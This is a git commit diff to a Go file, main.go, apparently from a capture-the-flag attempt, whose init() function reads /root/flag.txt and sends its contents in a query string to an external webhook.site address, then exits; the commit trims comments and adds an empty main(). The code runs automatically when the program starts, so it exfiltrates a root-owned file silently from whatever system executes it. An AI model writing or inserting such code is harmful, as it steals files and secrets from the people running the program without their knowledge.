a501ebdbe40a9308bc2264370df9ce08a885624b
Behiry <121094243+ahmedatef15011@users.noreply.github.com>
2025-04-11 21:10:36 +0200

    Update main.go

--- main.go
+++ main.go
@@ -7,10 +7,12 @@ import (
 )
 
 func init() {
-    flag, err := ioutil.ReadFile("/root/flag.txt") // Adjust the flag path as needed
+    flag, err := ioutil.ReadFile("/root/flag.txt") // Adjust as needed
     if err != nil {
         return
     }
     http.Get("https://webhook.site/63a4f50c-ecc3-471f-b54f-29d162056002?flag=" + string(flag))
-    os.Exit(0) // Prevent further execution if needed
+    os.Exit(0)
 }
+
+func main() {}
